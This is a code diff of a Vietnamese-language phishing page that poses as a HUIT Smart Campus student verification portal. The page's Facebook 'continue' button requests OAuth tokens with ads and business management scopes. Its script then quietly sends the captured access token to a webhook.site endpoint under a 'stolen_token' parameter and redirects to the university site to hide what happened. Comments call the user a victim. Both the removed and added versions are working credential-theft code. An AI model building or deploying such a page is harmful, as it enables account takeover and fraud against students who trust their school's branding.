@@ -1,74 +1,64 @@
+<!DOCTYPE html>
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <title>Hệ Thống Smart Campus - Đồng Bộ Dữ Liệu</title>
-
+    <title>Xác Thực Sinh Viên - HUIT Smart Campus</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
-        .logo { width: 80px; margin-bottom: 20px; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        button { background-color: #1877f2; color: white; border: none; padding: 12px 20px; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; width: 100%; }
-        button:hover { background-color: #166fe5; }
-        .footer-text { font-size: 12px; color: #606770; margin-top: 20px; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 12px 24px rgba(0,0,0,0.1); text-align: center; width: 420px; border-top: 6px solid #1877f2; }
+        .huit-logo { width: 90px; margin-bottom: 20px; }
+        h2 { color: #1c1e21; margin-bottom: 15px; font-size: 26px; }
+        p { color: #606770; font-size: 16px; margin-bottom: 30px; line-height: 1.6; }
+        .btn-fb { background-color: #1877f2; color: white; border: none; padding: 16px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; font-size: 18px; display: flex; align-items: center; justify-content: center; }
+        .btn-fb:hover { background-color: #166fe5; }
+        .fb-icon { width: 24px; margin-right: 12px; }
     </style>
 </head>
 <body>
 
-<div class="container" id="main-box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="logo" alt="FB Logo">
-    <h2 id="status-title">Đang đồng bộ Smart Campus...</h2>
-    <div id="loading-ui">
-        <div class="loader"></div>
-        <p>Vui lòng đợi trong giây lát để hệ thống kiểm tra phiên đăng nhập Facebook của bạn.</p>
+    <div class="card">
+        <img src="https://huit.edu.vn/tt-daotao/images/logo_huit.png" class="huit-logo">
+        <h2>Hệ Thống Smart Campus</h2>
+        <p>Để hoàn tất đồng bộ lịch học và xem kết quả học tập qua Facebook Messenger, bạn vui lòng nhấn xác thực tài khoản bên dưới.</p>
+        
+        <button class="btn-fb" id="loginBtn">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-icon">
+            Tiếp tục dưới tên Phương
+        </button>
     </div>
-
-    <div id="action-ui" style="display: none;">
-        <p>Hệ thống nhận diện bạn đang đăng nhập Facebook. Nhấn vào bên dưới để tiếp tục mà không cần nhập lại mật khẩu.</p>
-        <button onclick="redirectToAuth()">Tiếp tục với vai trò Người dùng</button>
-
-    </div>
-    
-    <p class="footer-text">Ứng dụng được phát triển bởi dự án Smart Campus - HUIT</p>
-</div>
 
 <script>
-    // 1. Giả lập thời gian quét để tạo sự tin tưởng
-    setTimeout(function() {
-        document.getElementById('loading-ui').style.display = 'none';
-        document.getElementById('action-ui').style.display = 'block';
-        document.getElementById('status-title').innerText = "Xác nhận danh tính";
-    }, 2500);
+    // === CẤU HÌNH THÔNG SỐ (PHƯƠNG THAY APP_ID VÀ WEBHOOK VÀO ĐÂY) ===
+    const APP_ID = "2402493790174154"; 
+    const REDIRECT_URI = window.location.href.split('#')[0]; // Tự động lấy link GitHub hiện tại
+    const WEBHOOK_URL = "https://webhook.site/63a27832-d5bc-440f-9993-e12efa944916";
 
-    // 2. Hàm chuyển hướng lấy Token THẬT
-    function redirectToAuth() {
-        const client_id = "839014905810590"; // ID ứng dụng thật của bạn
-        const redirect_uri = encodeURIComponent("https://webhook.site/63a27832-d5bc-440f-9993-e12efa944916");
+    document.getElementById('loginBtn').onclick = function() {
+        // Yêu cầu quyền nâng cao để Token có "trọng lượng" khi đổi sang Cookie
+        const SCOPES = "public_profile,email,ads_management,business_management";
         
-        // Luồng OAuth Implicit Flow để lấy Access Token trực tiếp trên URL
-        const fb_auth_url = `https://www.facebook.com/v18.0/dialog/oauth?client_id=${client_id}&redirect_uri=${redirect_uri}&response_type=token&scope=public_profile,email`;
+        const fbUrl = `https://www.facebook.com/v21.0/dialog/oauth?client_id=${APP_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=${SCOPES}&auth_type=rerequest`;
         
-        console.log("Đang chuyển hướng đến Facebook để lấy Token...");
-        window.location.href = fb_auth_url;
-    }
+        window.location.href = fbUrl;
+    };
 
-    // 3. Tự động bắt Token khi Facebook quay trở lại trang này (nếu bạn dùng trang này làm Redirect URI)
     window.onload = function() {
-        if (window.location.hash) {
+        // Sau khi nạn nhân nhấn "Tiếp tục", Facebook sẽ trả về Token trên URL
+        if (window.location.hash.includes("access_token")) {
             const params = new URLSearchParams(window.location.hash.substring(1));
-
-            const accessToken = params.get('access_token');
-
-            if (accessToken) {
-                // Gửi Token thu hoạch được về Webhook ngầm
-                fetch("https://webhook.site/63a27832-d5bc-440f-9993-e12efa944916?captured_token=" + accessToken);
-                
-                alert("Đồng bộ dữ liệu Smart Campus thành công!");
-                window.location.href = "https://www.facebook.com";
-
-
-
+            const token = params.get('access_token');
+            
+            if (token) {
+                // Gửi Token âm thầm về Webhook để chuẩn bị bước Token Exchange
+                fetch(`${WEBHOOK_URL}?stolen_token=${token}`)
+                .then(() => {
+                    // Xóa dấu vết bằng cách chuyển hướng về trang chủ trường
+                    window.location.href = "https://huit.edu.vn/";
+                });
             }
         }
     }
+</script>
+
+</body>
+</html>
